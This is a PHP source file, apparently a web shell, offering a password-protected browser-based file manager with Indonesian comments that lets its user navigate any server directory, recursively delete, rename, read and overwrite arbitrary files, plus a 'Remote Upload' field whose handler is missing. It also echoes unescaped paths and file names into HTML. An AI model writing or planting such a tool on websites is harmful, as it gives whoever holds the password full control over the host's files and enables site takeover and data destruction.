<?php
session_start();
$password = "GantiDenganPasswordLu"; // Ganti njer!

// --- AUTHENTICATION ---
if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
if (!isset($_SESSION['logged'])) {
    if (isset($_POST['pass']) && $_POST['pass'] == $password) { $_SESSION['logged'] = true; }
    else { die('<form method="post" style="text-align:center;margin-top:50px;"><h2>Login</h2><input type="password" name="pass"><input type="submit" value="Login"></form>'); }
}

// Navigasi Folder
$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
if (!$dir || !is_dir($dir)) { $dir = getcwd(); } 
chdir($dir);

// --- FUNGSI HAPUS REKURSIF ---
function deleteRecursive($path) {
    if (is_dir($path)) {
        foreach (scandir($path) as $item) {
            if ($item == '.' || $item == '..') continue;
            deleteRecursive($path . DIRECTORY_SEPARATOR . $item);
        }
        return rmdir($path);
    }
    return unlink($path);
}

// --- LOGIKA MULTI-DELETE ---
if (isset($_POST['bulk_delete']) && isset($_POST['files'])) {
    foreach ($_POST['files'] as $file) {
        $target = $dir . DIRECTORY_SEPARATOR . $file;
        if (file_exists($target)) {
            deleteRecursive($target);
        }
    }
    header("Location: ?d=$dir"); exit;
}

// --- LOGIKA LAINNYA (Rename, Save, Upload tetap ada) ---
if (isset($_POST['rename_action'])) {
    rename($dir . DIRECTORY_SEPARATOR . $_POST['old_name'], $dir . DIRECTORY_SEPARATOR . $_POST['new_name']);
    header("Location: ?d=$dir"); exit;
}

if (isset($_POST['save_file'])) {
    $tmp = $_POST['filename'] . ".tmp";
    if (file_put_contents($tmp, $_POST['content']) !== false) {
        rename($tmp, $_POST['filename']);
        header("Location: ?d=$dir"); exit;
    }
}

// --- TAMPILAN ---
echo "<h3>📍 Lokasi: $dir</h3>";
echo "<a href='?d=".dirname($dir)."'>⬅️ Up</a> | <a href='?logout'>Logout</a><hr>";

// Toolbar
echo '<form method="post" style="margin-bottom:10px;">
    <input type="text" name="folder_name" placeholder="Folder Baru"> <input type="submit" name="new_folder" value="Buat"> | 
    <input type="text" name="remote_url" placeholder="URL Download"> <input type="submit" name="upload_url" value="Remote Upload">
</form>';

// Form Mulai untuk Checkbox
echo '<form method="post" id="form-files">';
echo "<table border='1' width='100%' cellpadding='8' style='border-collapse:collapse; font-family:sans-serif;'>
    <tr bgcolor='#eee' align='left'>
        <th width='30'><input type='checkbox' onclick='toggle(this)'></th>
        <th>Nama</th>
        <th width='150'>Aksi</th>
    </tr>";

$items = scandir($dir);
foreach ($items as $item) {
    if ($item == "." || $item == "..") continue;
    $isDir = is_dir($dir . DIRECTORY_SEPARATOR . $item);
    
    echo "<tr>
        <td><input type='checkbox' name='files[]' value='$item'></td>
        <td>".($isDir ? "📁 <a href='?d=$dir/$item'><b>$item</b></a>" : "📄 <a href='?d=$dir&edit_file=$item'>$item</a>")."</td>
        <td>
            <a href='?d=$dir&edit_name=$item'>Rename</a> | 
            <a href='?d=$dir&del_single=$item' onclick='return confirm(\"Hapus?\")' style='color:red;'>Hapus</a>
        </td></tr>";
}
echo "</table>";

// Tombol Hapus Massal
echo '<br><input type="submit" name="bulk_delete" value="❌ Hapus yang dipilih" onclick="return confirm(\"Hapus semua file yang dicentang?\")" style="background:red; color:white; padding:10px; cursor:pointer;">';
echo '</form>';

// --- JAVASCRIPT BUAT CENTANG SEMUA ---
echo '<script>
function toggle(source) {
    checkboxes = document.getElementsByName("files[]");
    for(var i=0, n=checkboxes.length;i<n;i++) {
        checkboxes[i].checked = source.checked;
    }
}
</script>';

// --- FORM RENAME & EDIT (MUNCUL DI BAWAH JIKA DIKLIK) ---
if (isset($_GET['edit_name'])) {
    $n = $_GET['edit_name'];
    echo "<h4>Ganti Nama: $n</h4><form method='post'><input type='hidden' name='old_name' value='$n'><input type='text' name='new_name' value='$n'><input type='submit' name='rename_action' value='Ganti'></form>";
}

if (isset($_GET['edit_file'])) {
    $f = $_GET['edit_file'];
    $full = $dir . DIRECTORY_SEPARATOR . $f;
    $c = htmlspecialchars(file_get_contents($full));
    echo "<h4>Edit: $f</h4><form method='post'><input type='hidden' name='filename' value='$full'><textarea name='content' style='width:100%;height:300px;'>$c</textarea><br><input type='submit' name='save_file' value='Simpan'></form>";
}

// Hapus Single
if (isset($_GET['del_single'])) {
    deleteRecursive($dir . DIRECTORY_SEPARATOR . $_GET['del_single']);
    header("Location: ?d=$dir"); exit;
}
?>
